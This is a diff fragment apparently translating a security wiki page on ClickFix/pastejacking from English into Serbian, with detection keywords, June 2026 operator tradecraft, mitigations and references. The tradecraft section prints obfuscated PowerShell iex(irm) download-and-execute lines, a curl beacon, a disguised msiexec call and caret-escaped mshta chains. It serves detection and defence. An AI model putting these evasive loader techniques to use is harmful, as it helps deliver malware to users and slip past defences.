+- Ključne reči komandne linije: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domeni ili obrasci sa sirovom IP adresom `iex(irm ...)`.
+- Mreža: izlazne veze ka CDN worker hostovima ili blockchain RPC endpointima iz script hostova/PowerShell-a neposredno nakon web browsing-a.
+- Fajl/registry: kreiranje privremenog `.ps1` fajla u `%TEMP%`, zajedno sa RunMRU unosima koji sadrže ove one-linere; blokirati/upozoriti na potpisane script LOLBAS (`WScript/cscript/mshta`) koji se izvršavaju sa eksternim URL-ovima ili obfuskovanim alias stringovima.
 
-## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining
+## ClickFix tradecraft iz juna 2026: paste telemetrija, komentari lažne verifikacije i LOLBin chaining
 
-Recent Red Canary telemetry shows that the stable indicator is **not one exact command**, but the combination of **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, and **immediate execution**.
+Nedavna Red Canary telemetrija pokazuje da stabilni indikator **nije jedna tačna komanda**, već kombinacija **paste-and-run radnje uz pomoć korisnika**, **trusted interpreter-a/LOLBins**, **obfuskovanih flagova**, **remote retrieval-a** i **neposrednog izvršavanja**.<sup>[[7]](#references)</sup>
 
-### Notable operator patterns
+### Uočljivi obrasci operatora
 
-- **Paste confirmation telemetry**: some payloads call `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` before the real stage. This confirms user interaction while keeping the window short and quiet.
-- **Fake verification comments**: PowerShell one-liners may append strings such as `# Security check ✔️ I'm not a robot Verification ID: 138105` so the command still looks CAPTCHA-related after it is pasted into Run / `cmd.exe` / PowerShell history.
-- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` avoids a static URL in the command line while still performing in-memory download-and-execute.
-- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuses unusual casing and Unicode-like characters in flags to break brittle detections while still resembling `msiexec.exe`.
-- **Caret-escaped LOLBin chains**: `cmd.exe` can hide keywords with `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), start the nested shell minimized, save attacker content with a benign extension such as `.pdf`, and then execute it through `mshta`.
-## Mitigations
+- **Telemetrija potvrde paste radnje**: neki payload-i pozivaju `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` pre stvarne faze. Time se potvrđuje interakcija korisnika, uz kratak i neupadljiv prozor.
+- **Komentari lažne verifikacije**: PowerShell one-liners mogu dodati stringove kao što je `# Security check ✔️ I'm not a robot Verification ID: 138105`, tako da komanda i nakon paste radnje u Run / `cmd.exe` / PowerShell istoriji i dalje izgleda povezano sa CAPTCHA verifikacijom.
+- **Dinamička rekonstrukcija URL-a**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` izbegava statički URL u komandnoj liniji, ali i dalje izvršava download-and-execute iz memorije.
+- **Izvršavanje maskiranog installer-a**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` zloupotrebljava neuobičajena velika i mala slova i Unicode-like znakove u flagovima kako bi zaobišlo krhke detekcije, a da i dalje liči na `msiexec.exe`.
+- **LOLBin lanci sa escape-ovanim caret znakom**: `cmd.exe` može sakriti ključne reči pomoću `^` escape-ova (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), pokrenuti ugnježdeni shell minimizovan, sačuvati attacker sadržaj sa benignom ekstenzijom kao što je `.pdf`, a zatim ga izvršiti kroz `mshta`.<sup>[[7]](#references)</sup>
+## Mere zaštite
 
-1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
-2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
-3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
-4. Network controls – block outbound requests to known pastejacking and malware C2 domains.
+1. Ojačavanje browser-a – onemogućiti clipboard write-access (`dom.events.asyncClipboard.clipboardItem` itd.) ili zahtevati user gesture.
+2. Security awareness – obučiti korisnike da *otkucaju* osetljive komande ili da ih prvo nalepе u text editor.
+3. PowerShell Constrained Language Mode / Execution Policy + Application Control za blokiranje proizvoljnih one-liner-a.
+4. Mrežne kontrole – blokirati izlazne zahteve ka poznatim pastejacking i malware C2 domenima.
 
-## Related Tricks
+## Povezani trikovi
 
-* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:
+* **Discord Invite Hijacking** često zloupotrebljava isti ClickFix pristup nakon namamljivanja korisnika na malicious server:
 
 {{#ref}}
 discord-invite-hijacking.md
 {{#endref}}
 
-## References
+## Reference
 
-- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
-- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
-- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
-- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
-- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
-- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
-- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
-- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
+- [1] [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
+- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
+- [3] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [4] [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
+- [5] [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
+- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
+- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
 
 {{#include ../../banners/hacktricks-training.md}}
